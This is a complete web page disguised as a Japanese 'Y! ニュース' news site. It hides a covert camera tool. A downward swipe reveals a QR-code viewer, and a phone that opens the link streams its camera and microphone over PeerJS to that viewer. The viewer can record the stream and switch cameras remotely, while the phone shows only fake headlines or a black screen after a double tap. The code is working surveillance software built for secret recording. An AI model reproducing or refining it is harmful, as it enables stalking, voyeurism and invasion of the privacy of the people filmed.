<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Y! ニュース</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        /* 全体・リセット */
        body, html { margin: 0; padding: 0; font-family: sans-serif; background-color: #f4f5f7; width: 100%; height: 100%; }
        * { box-sizing: border-box; }
        
        /* モードごとのスクロール制御 */
        body.mode-initial { overflow: hidden; touch-action: none; }
        body.mode-camera { overflow: auto; touch-action: auto; }

        /* ニュースサイトのモックUI */
        #news-container { width: 100%; min-height: 100vh; background: #fff; display: flex; flex-direction: column; }
        .header { background-color: #ff0033; color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 10; font-weight: bold; font-size: 20px;}
        .header-nav { display: flex; gap: 15px; background: #fff; padding: 10px 15px; border-bottom: 1px solid #ddd; overflow-x: auto; font-size: 14px; font-weight: bold; color: #555;}
        .header-nav span { white-space: nowrap; }
        .header-nav span.active { color: #ff0033; border-bottom: 2px solid #ff0033; padding-bottom: 5px; }
        #btn-settings { font-size: 24px; cursor: pointer; }
        
        /* ニュース記事リスト */
        .news-list { padding: 10px; flex-grow: 1; }
        .news-item { display: flex; padding: 12px 0; border-bottom: 1px solid #eee; }
        .news-thumb { width: 80px; height: 80px; background-color: #ddd; border-radius: 4px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; color: #aaa; font-size: 12px;}
        .news-content { margin-left: 12px; display: flex; flex-direction: column; justify-content: space-between;}
        .news-title { font-size: 15px; font-weight: bold; color: #111; line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 3; -webkit-box-orient: vertical; overflow: hidden; }
        .news-time { font-size: 12px; color: #888; }

        /* 初回案内のオーバーレイ */
        #swipe-guide { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.8); color: #fff; padding: 20px; border-radius: 8px; text-align: center; pointer-events: none; z-index: 50; transition: opacity 0.5s; line-height: 1.6;}

        /* ビューアー画面 (全画面) */
        #viewer-screen { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #222; color: white; flex-direction: column; align-items: center; justify-content: center; z-index: 100; overflow: hidden;}
        
        /* ビューアーUI */
        #info-box { background: #333; padding: 20px; border-radius: 8px; text-align: center; width: 90%; max-width: 400px; display: flex; flex-direction: column; align-items: center; }
        #viewer-qrcode { margin: 15px 0; padding: 10px; background-color: #fff; border-radius: 4px; }
        #viewer-link-display { font-size: 12px; color: #aaa; margin: 10px 0; word-break: break-all; background: #222; padding: 8px; border-radius: 4px;}
        #remote-video { display: none; width: 100vw; height: 100vh; background-color: #000; object-fit: contain; }
        
        /* ビューアー操作ボタン群 */
        #viewer-controls { display: none; position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); z-index: 120; gap: 15px; width: 90%; justify-content: center;}
        .btn-viewer { background-color: #dc3545; color: white; border: 2px solid #fff; padding: 12px 20px; border-radius: 30px; font-size: 15px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center;}
        #btn-switch-cam { background-color: #007bff; } /* 切り替えボタンは青色 */

        /* ブラックアウト画面 */
        #black-overlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #000; z-index: 9999; }
        
        /* 隠しカメラ用要素 */
        #my-video { display: none; }
    </style>
</head>
<body class="mode-initial">

    <div id="black-overlay"></div>

    <div id="news-container">
        <div class="header">
            <span>Y! ニュース</span>
            <span id="btn-settings">⚙️</span>
        </div>
        <div class="header-nav">
            <span class="active">主要</span><span>国内</span><span>国際</span><span>経済</span><span>エンタメ</span><span>スポーツ</span><span>IT</span>
        </div>
        
        <div class="news-list" id="dummy-news">
            </div>

        <div id="swipe-guide">
            👇 <b>下スワイプ</b>: 映像を見る(ビューアー)<br><br>
            ※カメラとして使う場合は、スマホの標準カメラ等で<br>ビューアー側のQRコードを読み込んでください。
        </div>
    </div>

    <div id="viewer-screen">
        <div id="info-box">
            <div>カメラ端末でQRコードを読み込むと<br>自動で接続・配信が始まります</div>
            <div id="viewer-qrcode"></div>
            <div id="viewer-link-display">リンク生成中...</div>
            <div id="viewer-status" style="color: #0f0; font-size: 16px; margin-top: 10px; font-weight: bold;">接続待機中...</div>
        </div>
        <video id="remote-video" autoplay playsinline></video>
        
        <div id="viewer-controls">
            <button id="btn-switch-cam" class="btn-viewer">🔄 カメラ切替</button>
            <button id="btn-record" class="btn-viewer">🔴 録画開始</button>
        </div>
    </div>

    <video id="my-video" autoplay muted playsinline></video>

    <script>
        let peer;
        let currentMode = 'initial';
        
        // ダミーニュース生成
        const newsTitles = [
            "全国的に冷え込み強まる 明日にかけ積雪注意", "最新スマートフォンの売上高が過去最高を記録", 
            "週末のイベント情報：各地でフェスティバル開催", "日経平均株価、一時300円超の値下がり",
            "スポーツ速報：日本代表が劇的な逆転勝利", "話題のAI技術、日常生活への導入が加速",
            "新種の海洋生物を発見、生態系の解明へ", "有名俳優の電撃結婚発表にSNS騒然",
            "来年度の税制改正案、ポイントを徹底解説", "人気のカフェチェーン、秋の新作メニュー公開"
        ];
        const dummyNewsContainer = document.getElementById('dummy-news');
        for (let i = 0; i < 20; i++) {
            const item = document.createElement('div');
            item.className = 'news-item';
            item.innerHTML = `<div class="news-thumb">画像</div><div class="news-content"><div class="news-title">${newsTitles[i % newsTitles.length]}</div><div class="news-time">${Math.floor(Math.random() * 24)}時間前</div></div>`;
            dummyNewsContainer.appendChild(item);
        }

        // ベースURL管理
        function getBaseUrl() {
            let url = localStorage.getItem('cameraBaseUrl');
            if (!url) {
                url = window.location.href.split('?')[0];
                localStorage.setItem('cameraBaseUrl', url);
            }
            return url;
        }

        document.getElementById('btn-settings').addEventListener('click', () => {
            if (currentMode !== 'initial') return; 
            let currentUrl = getBaseUrl();
            let newUrl = prompt('QRコードの遷移先(ベースURL)を設定してください。\n※インターネット上にアップロードしたURLを入力してください。', currentUrl);
            if (newUrl && newUrl.trim() !== '') {
                localStorage.setItem('cameraBaseUrl', newUrl.trim());
                alert('設定を保存しました。');
            }
        });

        // 初期ロード時判定
        window.onload = () => {
            setTimeout(() => {
                const guide = document.getElementById('swipe-guide');
                if (guide) guide.style.opacity = '0';
            }, 5000);

            const urlParams = new URLSearchParams(window.location.search);
            const targetId = urlParams.get('id');
            const targetPin = urlParams.get('pin');

            if (targetId && targetPin) {
                startCameraMode(targetId, targetPin);
            }
        };

        // スワイプ検知
        let touchstartY = 0;
        let touchendY = 0;
        const newsContainer = document.getElementById('news-container');

        newsContainer.addEventListener('touchstart', e => {
            if (currentMode !== 'initial') return;
            touchstartY = e.changedTouches[0].screenY;
        }, {passive: true});

        newsContainer.addEventListener('touchend', e => {
            if (currentMode !== 'initial') return;
            touchendY = e.changedTouches[0].screenY;
            if (touchendY - touchstartY > 80) startViewerMode();
        }, {passive: true});

        // ダブルタップ検知
        let clickCount = 0;
        let clickTimer;
        newsContainer.addEventListener('click', () => {
            if (currentMode !== 'camera') return;
            clickCount++;
            if (clickCount === 2) {
                document.getElementById('black-overlay').style.display = 'block';
                clickCount = 0;
                clearTimeout(clickTimer);
            } else {
                clickTimer = setTimeout(() => { clickCount = 0; }, 300);
            }
        });

        document.getElementById('black-overlay').addEventListener('click', function() {
            this.style.display = 'none';
        });

        // --- ビューアーモード ---
        function startViewerMode() {
            currentMode = 'viewer';
            document.body.className = ''; 
            document.getElementById('news-container').style.display = 'none';
            document.getElementById('viewer-screen').style.display = 'flex';

            peer = new Peer();
            const viewerPin = Math.floor(100000 + Math.random() * 900000).toString(); 

            const videoEl = document.getElementById('remote-video');
            const infoBox = document.getElementById('info-box');
            const statusEl = document.getElementById('viewer-status');
            const controlsEl = document.getElementById('viewer-controls');
            const recordBtn = document.getElementById('btn-record');
            const switchBtn = document.getElementById('btn-switch-cam');
            
            let mediaRecorder;
            let recordedChunks = [];
            let currentDataConn = null; // カメラ側への命令送信用

            peer.on('open', (id) => {
                const baseUrl = getBaseUrl();
                const connectionLink = `${baseUrl}?id=${id}&pin=${viewerPin}`;
                document.getElementById('viewer-link-display').textContent = connectionLink;
                const qrcodeEl = document.getElementById('viewer-qrcode');
                qrcodeEl.innerHTML = '';
                new QRCode(qrcodeEl, { text: connectionLink, width: 200, height: 200 });
            });

            // データ通信の受信（カメラから接続されたとき）
            peer.on('connection', (conn) => {
                if (conn.metadata && conn.metadata.password === viewerPin) {
                    currentDataConn = conn;
                }
            });

            // 映像の受信
            peer.on('call', (call) => {
                if (call.metadata && call.metadata.password === viewerPin) {
                    statusEl.textContent = 'カメラが接続しました！映像を受信中...';
                    call.answer(); 

                    call.on('stream', (remoteStream) => {
                        infoBox.style.display = 'none';
                        videoEl.style.display = 'block'; 
                        videoEl.srcObject = remoteStream;
                        controlsEl.style.display = 'flex'; // ボタン群を表示
                        
                        // --- 録画機能 ---
                        recordBtn.onclick = (e) => {
                            e.stopPropagation(); 
                            if (mediaRecorder && mediaRecorder.state === 'recording') {
                                mediaRecorder.stop();
                                recordBtn.textContent = '🔴 録画開始';
                                recordBtn.style.backgroundColor = '#dc3545';
                            } else {
                                recordedChunks = [];
                                mediaRecorder = new MediaRecorder(remoteStream);
                                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
                                mediaRecorder.onstop = () => {
                                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                                    const url = URL.createObjectURL(blob);
                                    const a = document.createElement('a');
                                    a.style.display = 'none';
                                    a.href = url;
                                    a.download = `camera_record_${new Date().getTime()}.webm`; 
                                    document.body.appendChild(a);
                                    a.click();
                                    setTimeout(() => { document.body.removeChild(a); URL.revokeObjectURL(url); }, 100);
                                };
                                mediaRecorder.start();
                                recordBtn.textContent = '⏹ 録画停止';
                                recordBtn.style.backgroundColor = '#6c757d';
                            }
                        };

                        // --- カメラ切り替え命令送信 ---
                        switchBtn.onclick = (e) => {
                            e.stopPropagation();
                            if (currentDataConn && currentDataConn.open) {
                                // カメラ側に切り替えコマンドを送信
                                currentDataConn.send({ command: 'switch_camera' });
                            } else {
                                alert("カメラとの通信が確立されていません");
                            }
                        };
                    });
                } else {
                    call.close();
                }
            });

            videoEl.addEventListener('click', () => {
                if (!document.fullscreenElement) {
                    if (videoEl.requestFullscreen) videoEl.requestFullscreen();
                    else if (videoEl.webkitRequestFullscreen) videoEl.webkitRequestFullscreen();
                } else {
                    if (document.exitFullscreen) document.exitFullscreen();
                }
            });
        }

        // --- カメラモード (バックグラウンド配信) ---
        function startCameraMode(targetId, targetPw) {
            currentMode = 'camera';
            document.body.className = 'mode-camera'; 
            document.getElementById('news-container').style.display = 'flex';
            const guide = document.getElementById('swipe-guide');
            if(guide) guide.style.display = 'none';

            peer = new Peer();
            let currentStream = null;
            let currentCall = null;
            let isFrontCamera = false; // 初期値は外カメラ(背面)

            // ビューアーへ映像とデータを接続する処理
            function connectToViewer(stream) {
                currentStream = stream;
                document.getElementById('my-video').srcObject = stream;
                
                // 映像接続
                currentCall = peer.call(targetId, stream, { metadata: { password: targetPw } });
                currentCall.on('error', (err) => console.error('映像接続エラー:', err));

                // データ通信接続（切り替え命令を受け取るため）
                const dataConn = peer.connect(targetId, { metadata: { password: targetPw } });
                dataConn.on('open', () => {
                    dataConn.on('data', (data) => {
                        if (data.command === 'switch_camera') {
                            switchCamera();
                        }
                    });
                });
            }

            // カメラの向きを反転してトラックを差し替える関数
            function switchCamera() {
                isFrontCamera = !isFrontCamera;
                const facingMode = isFrontCamera ? 'user' : 'environment';

                // 映像のみ再取得 (音声はそのまま)
                navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } })
                    .then((newStream) => {
                        const newVideoTrack = newStream.getVideoTracks()[0];
                        const oldVideoTrack = currentStream.getVideoTracks()[0];

                        // WebRTC接続に乗っている映像トラックを、新しいカメラのものに差し替え
                        const sender = currentCall.peerConnection.getSenders().find(s => s.track.kind === 'video');
                        if (sender) {
                            sender.replaceTrack(newVideoTrack).then(() => {
                                // 古いカメラを停止して解放
                                oldVideoTrack.stop();
                                currentStream.removeTrack(oldVideoTrack);
                                currentStream.addTrack(newVideoTrack);
                                document.getElementById('my-video').srcObject = currentStream;
                            }).catch(err => console.error('トラック差し替えエラー:', err));
                        }
                    })
                    .catch(err => console.error('カメラ切り替えアクセスエラー:', err));
            }

            // 初回のカメラ取得（映像と音声）
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true })
                .then((stream) => {
                    // IDが取得できたら接続開始
                    peer.on('open', () => {
                        connectToViewer(stream);
                    });
                })
                .catch((err) => {
                    alert('カメラ・マイクのアクセス許可が必要です。設定からブラウザの権限を確認してください。');
                });
        }
    </script>
</body>
</html>
